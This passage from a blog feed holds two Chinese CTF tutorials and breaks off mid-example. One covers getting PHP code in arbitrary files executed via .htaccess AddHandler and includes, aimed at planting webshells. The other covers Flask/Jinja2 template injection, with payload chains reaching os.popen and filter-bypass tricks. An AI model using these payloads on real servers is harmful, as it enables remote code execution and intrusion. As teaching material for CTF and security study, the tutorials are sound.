      <link href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/"/>
      <url>/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>按照一般植入webshell的方法通常是上传一段包含恶意代码文件，然后让服务器解析文件里的恶意代码从而得到get shell的目的。那么问题来了,文件中什么的字符会被当成php代码来解析？PHP代码中指令怎么分割？什么样的文件服务器会去解析？(本文章默认要执行的文件已在网站目录下的情况)</p><a id="more"></a><h2 id="0x01PHP代码的特征"><a href="#0x01PHP代码的特征" class="headerlink" title="0x01PHP代码的特征"></a>0x01PHP代码的特征</h2><p>当然一个文件被php解析时不会全部都拿去执行，而是将具有php代码特征的部分拿去执行。而那特征就是php的开始与结束标记。</p><p>按照官方的说法：PHP解析器当解析一个文件时，PHP 会寻找起始和结束标记，这告诉 PHP 二者标记之间的是要解析的php代码。此种解析方式使得 PHP 可以被嵌入到各种不同的文档中去，而任何起始和结束标记之外的部分都会被 PHP 解析器忽略。</p><p>在官方文档中，给我们提供以下几种php起始和结束标记：</p><h3 id="1-’-lt-php’-与’-gt-‘"><a href="#1-’-lt-php’-与’-gt-‘" class="headerlink" title="(1)’&lt; ?php’ 与’? &gt;‘"></a>(1)’&lt; ?php’ 与’? &gt;‘</h3><p>这种标记用法是最常见的用法，也被称为长标签：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="comment">#起始标记,php可以大小写混用</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'this is php code'</span>;<span class="comment">#php代码部分</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">#结束标记</span></span><br></pre></td></tr></table></figure><h3 id="2-lt-script-gt-标签标记"><a href="#2-lt-script-gt-标签标记" class="headerlink" title="(2)&lt;script&gt;标签标记"></a>(2)&lt;script&gt;标签标记</h3><p>用script标签来标记php代码,使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;#php可以大小写混用</span><br><span class="line">        echo &#39;this is php code by script&#39;;#php代码部分</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>注意的是在php 7.0.0 版本后，，默认不支持这种写法。</p><h3 id="3-ASP-风格标记"><a href="#3-ASP-风格标记" class="headerlink" title="(3)ASP 风格标记"></a>(3)ASP 风格标记</h3><p>用&lt;%%&gt;来标记php,如要使用此种标记要php.ini 配置文件中的指令 asp_tags=On后才可用。 但要注意的是在7.0.0后的版本里移除了asp_tags.</p><p>具体使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;标记用法：</span><br><span class="line">&lt;%  echo &#39;this is php code by ASP&#39;; %&gt;</span><br><span class="line">&lt;% %&gt;格式的 echo 标记用法：</span><br><span class="line">&lt;%&#x3D;&#39;text&#39;; %&gt;#类似&lt;% echo &#39;echo&#39;;%&gt;</span><br></pre></td></tr></table></figure><h3 id="4-使用短标签来标记"><a href="#4-使用短标签来标记" class="headerlink" title="(4)使用短标签来标记"></a>(4)使用短标签来标记</h3><p>短标记（&lt;? ?&gt;）仅在通过 php.ini 配置文件中的指令 short_open_tag =On后才可用，或者在 PHP 编译时加入了 –enable-short-tags 选项.具体使用方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo&#39;this is php code by ASP&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>同时这种标签也有 echo 标记 ‘&lt;?=’:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;&#39;text&#39;; ?&gt;#等价&lt;? echo &#39;echo&#39;;?&gt;的使用方式</span><br></pre></td></tr></table></figure><p>注意的是：PHP 5.4 起，短格式的 echo 标记 &lt;?= 总会被识别并且合法，而不管 short_open_tag 的设置是什么。</p><h2 id="0x02如何分割PHP代码指令"><a href="#0x02如何分割PHP代码指令" class="headerlink" title="0x02如何分割PHP代码指令"></a>0x02如何分割PHP代码指令</h2><p>同 C 或 Perl 一样，PHP 需要在每个语句后用分号结束指令。一段 PHP 代码中的结束标记隐含表示了一个分号；在一个 PHP 代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;单行代码可以省略;</span><br><span class="line">&lt;?php</span><br><span class="line">  echo &#39;this one commod&#39; </span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;多行代码，1句代码后要加;号,最后一行可以不用分号结束</span><br><span class="line">&lt;?php</span><br><span class="line">      echo &#39;this one commod&#39;;</span><br><span class="line">      echo &#39;this one commod&#39; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>除了用；号分割外，也可以用php标记来分隔：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $a&#x3D;&#39;this a code&#39;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?&#x3D;$a ?&gt;</span><br></pre></td></tr></table></figure><p>执行效果：</p><p><img src="image-20200515224849956.png" alt=""></p><h2 id="0x03让文件被服务器解析"><a href="#0x03让文件被服务器解析" class="headerlink" title="0x03让文件被服务器解析"></a>0x03让文件被服务器解析</h2><p>我们一般在初学php时，一般都是用phpstudy 或者Wampserver 来一件搭建php环境的。但在搭建后，就会发现一个问题。只有后缀名为php的文件里面的php代码被执行了,而其他后缀名的文件就算里面有php特征标记的php代码也没有被执行。</p><p><img src="image-20200517152606197.png" alt="image-20200517152606197"></p><p><img src="image-20200517152713360.png" alt="image-20200517152713360"></p><p>可见网站的服务器并未让非php文件里代码被执行。这是为什么？</p><p>这是因为网站的服务器在处理这个非php文件时，并未让它进入php解释器处理，而直接将数据传送过来。</p><p>那么问题来了如让服务器把文件送入php解释器？</p><h3 id="1-更改服务器的httpd-conf配置"><a href="#1-更改服务器的httpd-conf配置" class="headerlink" title="1.更改服务器的httpd.conf配置"></a>1.更改服务器的httpd.conf配置</h3><p>这里改法又有两种方法</p><h4 id="（1）使用AddHandler-指令："><a href="#（1）使用AddHandler-指令：" class="headerlink" title="（1）使用AddHandler 指令："></a>（1）使用AddHandler 指令：</h4><p>AddHandler 说明什么样的扩展名使用什么样的程序来处理，描述的是扩展名与处理程序之间的关系。具体用法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script  .extension</span><br><span class="line">#或者</span><br><span class="line">AddHandler application&#x2F;x-httpd-php  .extension</span><br><span class="line"></span><br><span class="line">extension代表任意文件的后缀名</span><br></pre></td></tr></table></figure><p><img src="image-20200517171022134.png" alt="image-20200517171022134"></p><p><img src="image-20200517170537530.png" alt="image-20200517170537530"></p><h4 id="（2）使用AddType指令："><a href="#（2）使用AddType指令：" class="headerlink" title="（2）使用AddType指令："></a>（2）使用AddType指令：</h4><p>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系.也可以用来描述后缀名与php解释器之间的关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType php5-script   .extension</span><br><span class="line">AddType application&#x2F;x-httpd-php  .extension</span><br></pre></td></tr></table></figure><p><img src="image-20200517172127721.png" alt="image-20200517172127721"></p><p><img src="image-20200517172408752.png" alt="image-20200517172408752"></p><h3 id="2-更改-htaccess文件"><a href="#2-更改-htaccess文件" class="headerlink" title="2.更改.htaccess文件"></a>2.更改.htaccess文件</h3><p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。如果要用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p><p>在/www/htdocs/example目录下的.htaccess文件中放置指令，与在主配置文件中&lt;Directory /www/htdocs/example&gt;段中放置相同指令，是完全等效的。</p><p>另外, .htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但要注意的是子目录中的 .htaccess中的指令会覆盖父目录的 .htaccess中的指令或者主配置文件中的指令。</p><p>我们可以在.htaccess文件中写入配置命令来达成我们的目的，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php  .extension</span><br></pre></td></tr></table></figure><p><img src="image-20200517224034769.png" alt="image-20200517224034769"></p><h3 id="3-更改php-fpm-conf"><a href="#3-更改php-fpm-conf" class="headerlink" title="3.更改php-fpm.conf"></a>3.更改php-fpm.conf</h3><p>php-fpm中文名称php FastCGI 进程管理器。PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。PHP-FPM提供了更好的PHP进程管理方式，可以有效控制内存和进程、可以平滑重载PHP配置。</p><p>php-fpm.conf文件里的security.limit_extensions 选项的参数作用是限制 FPM 允许解析的脚本扩展名。 此设置可以预防 web 服务器配置的错误。 应当限制 FPM 仅仅解析 .php 扩展名，阻止恶意用户使用其他扩展名运行 php 代码。 默认值： .php .phar</p><h3 id="4-利用文件包含来包含文件"><a href="#4-利用文件包含来包含文件" class="headerlink" title="4.利用文件包含来包含文件"></a>4.利用文件包含来包含文件</h3><p>php在文件包含进行文件包含会执行php标记里代码。因此我们可以通过php的文件包含函数来通过一个执行的php页面来包含我们想要执行文件。</p><p>常见的文件包含的函数有：</p><p>1.include()  ：在包含文件没找到时会产生警告，并继续进行php代码。</p><p>2.include_once() ：在include() 的特性下，多了只能包含一次的特性。</p><p>3.require()：在包含文件没找到时会停止进行php代码。</p><p>4.require_once()：在require() 的特性下，多了只能包含一次的特性。</p><h2 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h2><p><a href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener">PHP 代码分离</a></p><p><a href="https://www.php.net/manual/zh/language.basic-syntax.instruction-separation.php" target="_blank" rel="noopener">php指令分割</a></p><p><a href="https://www.php.net/manual/zh/security.hiding.php" target="_blank" rel="noopener"> PHP 的文件后缀</a></p><p><a href="https://www.php.net/manual/zh/install.fpm.configuration.php" target="_blank" rel="noopener">FPM 的官方介绍</a></p><p><a href="https://baike.baidu.com/item/htaccess/1645473?fr=aladdin" target="_blank" rel="noopener">htaccess文件的介绍</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于python ssti的思考</title>
      <link href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1关于ssti的讲解"><a href="#0x1关于ssti的讲解" class="headerlink" title="0x1关于ssti的讲解"></a>0x1关于ssti的讲解</h2><p>1.什么是ssti?</p><p>SSTI就是服务器端模板注入(Server-Side Template Injection).在一般的ctf中主要考查python比较多，故这篇文章主要是分析python下的ssti。</p><a id="more"></a><p>2.ssti出现的原因</p><p>ssti起因是在通过与服务端模板的输入输出交互时,服务器端把用户提交的数据处理,当成了代码来执行.从而让恶意用户通过构建了恶意代码,来读取了服务器上的信息或得到了服务器的shell.例如：在python的flask中，会把<code>{ {</code> <code>} }</code>号里面的参数当成代码来执行，如<code>{ {1+1} }</code>会被执行成为<code>{ {2} }</code>。</p><p>3.ssti漏洞的发现</p><p>对目标机构造payload来分析，如<code>{ {7+7} }</code>，<code>{ {&#39;7&#39;+&#39;7&#39;} }</code>等。看是否有ssti。再参考下图分析是何种模板的ssti</p><p><img src="image-20200327224713117.png" alt="image-20200327224713117"></p><p>​    </p><h2 id="0x2python基础"><a href="#0x2python基础" class="headerlink" title="0x2python基础"></a>0x2python基础</h2><h3 id="01-python魔术方法"><a href="#01-python魔术方法" class="headerlink" title="01.python魔术方法"></a>01.python魔术方法</h3><p>由于python的语法一贯奉行“一切皆是对象”的原则，所以python的一切变量都由类实例而来同时python有很多管理这些类与对象的内置魔术方法或函数。下面介绍几个常用的与类有关的魔术方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>） __class__</span><br><span class="line"><span class="comment">#__class__功能和type()函数一样，都是查看对象所在的类（子实例找父实例）。</span></span><br><span class="line"><span class="number">2</span>）__base__</span><br><span class="line"><span class="comment">#__base__的作用是查询一个类的父类。</span></span><br><span class="line"><span class="number">3</span>）__mro__</span><br><span class="line"><span class="comment">#返回包含回朔一个类所由继承过的父类的元组。</span></span><br><span class="line"><span class="number">4</span>）__subclasses__()</span><br><span class="line"><span class="comment">#返回包含一个类的所有子类的列表。</span></span><br><span class="line"><span class="number">5</span>）__builtins__()</span><br><span class="line"><span class="comment">#builtins就是内置模块的一个引用。像__import__()、open、eval等内置函数所在的模块就内置模块。大多数模块都将名称 __builtins__ 作为其全局变量的一部分.</span></span><br><span class="line"><span class="number">6</span>）__init__</span><br><span class="line"><span class="comment">#类实例化出一个对象时进行初始化方法。</span></span><br><span class="line"><span class="number">7</span>）__globals__</span><br><span class="line"><span class="comment">#返回一个函数所在空间的所有类、属性、子模块与方法的字典。</span></span><br><span class="line"><span class="number">8</span>）__dict__</span><br><span class="line"><span class="comment">#返回包含一个模块所拥有类、属性、子模块与方法的字典。</span></span><br><span class="line"><span class="number">9</span>）__getattribute__</span><br><span class="line"><span class="comment">#虽然这个魔术方法该方法可以拦截对对象属性的所有访问企图。但也有访问对象属性的功能。可以用来进行一些绕过。</span></span><br></pre></td></tr></table></figure><h3 id="02-文件操作和命令执行相关的python模块"><a href="#02-文件操作和命令执行相关的python模块" class="headerlink" title="02.文件操作和命令执行相关的python模块"></a>02.文件操作和命令执行相关的python模块</h3><h6 id="1-builtins模块"><a href="#1-builtins模块" class="headerlink" title="1)builtins模块"></a>1)builtins模块</h6><p>是python的一个内置函数所在模块,里面的函数无需import就能访问。</p><ol><li><p>eval()</p><p>执行1句简单的python代码，并返回结果。</p></li><li><p>exec()</p><p>执行多句python代码，但返回值永远为None。</p></li><li><p>open()</p><p>打开一个文件</p></li></ol><h6 id="2）os模块"><a href="#2）os模块" class="headerlink" title="2）os模块"></a>2）os模块</h6><p>该模块提供了一些方便使用操作系统相关功能的函数。这主要说与文件操作和命令执行相关的函数</p><ol><li><p>os.system  (cmd)</p><p>执行操作系统(shell)命令，若执行成功返回值为0。</p></li><li><p>os.popen(cmd)  .read()</p><p>os.popen()函数可以用来执行操作系统(shell)命令。通过read()函数来读取返回结果。除此外还有so.popen2(),so.popen3().</p></li><li><p>os.open(filename)</p><p>可以用来打开读取文件。</p></li></ol><h6 id="3-platform模块"><a href="#3-platform模块" class="headerlink" title="3)platform模块"></a>3)platform模块</h6><p> python中，platform模块给我们提供了很多方法去管理操作系统。</p><ol><li><p>platform.popen(cmd, mode=’r’, bufsize=None) </p><p>platform.popen函数可以用来执行操作系统(shell)命令。但与os.popen()函数通类似过read()函数来读取返回结果。                 </p></li></ol><h6 id="4-timeit-模块"><a href="#4-timeit-模块" class="headerlink" title="4)timeit 模块"></a>4)timeit 模块</h6><p>​        模块中的timeit.timeit() 本是检测性能的，也可以任意代码执行。但是没有回显。用法如timeit.timeit(“<strong>import</strong>(‘os’).system(cmd)”,number=1)         </p><h6 id="5-commands模块"><a href="#5-commands模块" class="headerlink" title="5)commands模块"></a>5)commands模块</h6><p>commands模块只存在于Python 2.7中，且不支持windows平台，因此commands模块很少被使用。另外，commands模块实际上也是通过对os.popen()的封装来完成的。</p><ol><li><p>commands.getoutput(cmd)</p><p>接收字符串格式的命令，执行命令并返回执行结果。</p></li><li><p>commands.getstatusoutput(cmd)</p><p>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)。</p></li></ol><h6 id="6-subprocess模块"><a href="#6-subprocess模块" class="headerlink" title="6)subprocess模块"></a>6)subprocess模块</h6><p>subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道.此模块打算代替一些老旧的模块与功能如：os模块、commands模块等。</p><ol><li><p>subprocess.run(cmd)</p><p>Python 3.5版本以后才有的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例</p></li><li><p>subprocess.call(cmd,shell=True)</p><p>执行由参数提供的命令。我们可以用数组作为参数运行命令，也可以用字符串作为参数运行命令(通过设置参数shell=True)如果执行成功则返回状态码。</p></li><li><p>subprocess.check_call(cmd)</p><p>执行指定的命令，如果执行成功则返回状态码，否则抛出异常.</p></li><li><p>subprocess.check_output(cmd)</p><p>执行指定的命令，如果执行成功则返回结果，否则抛出异常.</p></li><li><p>subprocess.getstatusoutput(cmd)</p><p>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)。</p></li><li><p>subprocess.getoutput(cmd)</p><p>接收字符串格式的命令，执行命令并返回执行结果。</p></li></ol><h3 id="03-一些提高效率的函数"><a href="#03-一些提高效率的函数" class="headerlink" title="03.一些提高效率的函数"></a>03.一些提高效率的函数</h3><p>1.index()</p><p>检查字符串是否包含某个字符或字符串。还有可以用来查询列表里是否有某个元素。若春在则返回第一次出现时的下标或索引。ps：当参数有.符号时可能出现该函数查不出来但存在的现象（解析逻辑问题）</p><p>2.keys()</p><p>将键的单独提取成一个列表。在某些过滤了中括号的情况下与index()用来代替中括号的效果。</p><h3 id="04-关于flask"><a href="#04-关于flask" class="headerlink" title="04.关于flask"></a>04.关于flask</h3><p>flask由 Jinja2 模板开发而来的web框架。缺省情况下，以下全局变量可以在 Jinja2 模板中使用，同时也值得我们关注：</p><h4 id="1-config"><a href="#1-config" class="headerlink" title="1) config"></a>1) config</h4><p>获取当前配置对象（ flask.config ）,可以得到些配置信息(有点类似php中phpinfo的作用).比如:是否打开session,SECRET_KEY(python默认的session加密方式的密钥）的值。</p><p>在 version 0.10后,这个变量总是可用，甚至是在被导入的模板中。</p><p>这个对象是在 version 0.6. 后才有的.</p><h4 id="2-request"><a href="#2-request" class="headerlink" title="2)request"></a>2)request</h4><p>获取请求对象（ flask.request ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="3-session"><a href="#3-session" class="headerlink" title="3)session"></a>3)session</h4><p>获取当前会话对象（ flask.session ）。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="4-g"><a href="#4-g" class="headerlink" title="4)g"></a>4)g</h4><p>请求绑定的全局变量（ flask.g ）。在flask中，有一个专门用来存储用户信息的g对象，g的全称的为global。g对象在一次请求中的所有的代码的地方，都是可以使用的。 在没有活动请求环境情况下渲染模板时，这个变量不可用。</p><h4 id="5-url-for"><a href="#5-url-for" class="headerlink" title="5)url_for()"></a>5)url_for()</h4><p>flask.url_for() 函数。url_for() 会返回传入的路由函数对应的URL，所谓路由函数就是被 app.route() 路由装饰器装饰的函数。如果我们定义的路由函数是带有参数的，则可以将这些参数作为命名参数传入。</p><h5 id="6-get-flashed-messages"><a href="#6-get-flashed-messages" class="headerlink" title="6)get_flashed_messages()"></a>6)get_flashed_messages()</h5><p>flask.get_flashed_messages() 函数。返回之前在Flask中通过 flash() 传入的信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出。</p><h2 id="0x3ssti注入的一般攻击流程"><a href="#0x3ssti注入的一般攻击流程" class="headerlink" title="0x3ssti注入的一般攻击流程"></a>0x3ssti注入的一般攻击流程</h2><p>1.找到环境中的可以使用的环境变量,例如:内置函数方法（url_for()函数、get_flashed_messages()函数）、内置类的实例变量(‘’,[]，config，self)。</p><p>2.若已得到内置函数方法则跳第4步骤，从内置类的实例变量方向出发的通过类的关系通过<code>__class__、__base__ or  __mro__</code>找到基本类（object类）.注意：python2与python3这步有的差别。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2:</span></span><br><span class="line">  <span class="comment"># __base__路线</span></span><br><span class="line">      <span class="string">''</span>.__class__.__base__.__base__</span><br><span class="line">      <span class="comment">#__mro__路线1</span></span><br><span class="line">       <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"><span class="comment">#python 3:</span></span><br><span class="line">       <span class="comment"># __base__路线</span></span><br><span class="line">       <span class="string">''</span>.__class__.__base__</span><br><span class="line">       <span class="comment">#__mro__路线1</span></span><br><span class="line">        <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">       </span><br><span class="line"> <span class="comment">#python 2/3 都可以用 的__mro__路线</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>3.通过<code>__subclasses__()</code>获取所有object类的子类，并用 <code>__dict__</code>从中寻找类其拥有的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()</span><br><span class="line"><span class="comment">#获取所有object类的子类</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[x].__dict__</span><br><span class="line"><span class="comment">#x表__subclasses__()返回列表的任意存在索引。</span></span><br><span class="line"><span class="comment">#__dict__ 中带有&lt;function &gt; 就是我们可以利用的方法例如：&lt;function __init__ at 0x7f8a189dc320&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#大多数类重载的了__init__方法，__init__方法也有__globals__属性。因此我们可以直接遍历x找带有__init__的类。</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[x].__init__</span><br></pre></td></tr></table></figure><p>4.通过<code>__globals__</code>或<code>func_globals</code>得到的方法所在空间的所有类、属性、子模块与方法。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url_for.func_globals</span><br><span class="line">url_for.__globals__</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.__globals__</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].reset.__globals__</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].reset.func_globals</span><br></pre></td></tr></table></figure><p>5若上一步返回的结果里有需要的方法就可以直接调用;若想调用内置库的函数用<strong>builtins</strong> ;若想调用第三方库（模块）可以继续用<strong>import</strong>载入:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#若上一步返回的结果里有需要的方法就可以直接调用;</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.getreader</span><br><span class="line"><span class="comment">#若想调用内置库的函数,利用__builtins__属性:</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.__builtins__.eval()</span><br><span class="line"><span class="comment">#若想调用第三方库（模块）可以后加__import__载入;</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">78</span>].__init__.func_globals.__builtins__.__import__(<span class="string">'os'</span>).popen</span><br></pre></td></tr></table></figure><h2 id="0x4常见绕过方式"><a href="#0x4常见绕过方式" class="headerlink" title="0x4常见绕过方式"></a>0x4常见绕过方式</h2><h6 id="1-过滤中括号"><a href="#1-过滤中括号" class="headerlink" title="1)过滤中括号"></a>1)过滤中括号</h6><ol><li><p><code>__getitem__</code>方法，该方法用来获取指定索引对应的元素。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">40</span>)</span><br></pre></td></tr></table></figure><p>来获取<code>__mro__</code>所得元组的最后一个元素和<code>__subclasses__()</code>返回的列表里的索引为40的元素。</p></li><li><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。我们可以用pop() 来代替中括号。里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过。例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__base__.__subclasses__().pop(<span class="number">40</span>)</span><br></pre></td></tr></table></figure><p>来获得<code>__subclasses__()</code>返回的列表里的索引为40的元素。</p></li></ol><h6 id="2-过滤双下划线"><a href="#2-过滤双下划线" class="headerlink" title="2)过滤双下划线"></a>2)过滤双下划线</h6><ol><li><p>request.args 是flask中的一个属性,为返回请求的参数,这里自己设置一个变量名,将后面的路径传值进来,进而绕过了’_’的过滤.</p><p>例如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request.args.class][request.args.x1][request.args.x2][request.args.x3]()[40]&#125;&#125;?class=__class__&amp;x1=__base__&amp;x2=__base__&amp;x3=__subclasses__</span><br></pre></td></tr></table></figure><p>通过自己设置变量class、x1、x2、x3来传递参数从而绕过。</p></li><li><p>同request.args，request.values也有类似的作用，不过要利用post的方式进行传参。</p></li><li><p>在<code>dir()</code>没有被ban下可以用<code>dir(0)[0][0]</code>来引入’_’.</p><p>例： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">'class'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#等价于''.__class__（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li>利用格式化字符串特性。用<code>&#39;{0:c}&#39;[&#39;format&#39;](95)</code>或<code>&quot;%c&quot;%(95)</code></li></ol><h6 id="3-过滤了’-’号"><a href="#3-过滤了’-’号" class="headerlink" title="3)过滤了’.’号"></a>3)过滤了’.’号</h6><ol><li><p>用中括号来代替。</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__class__'</span>]等价于<span 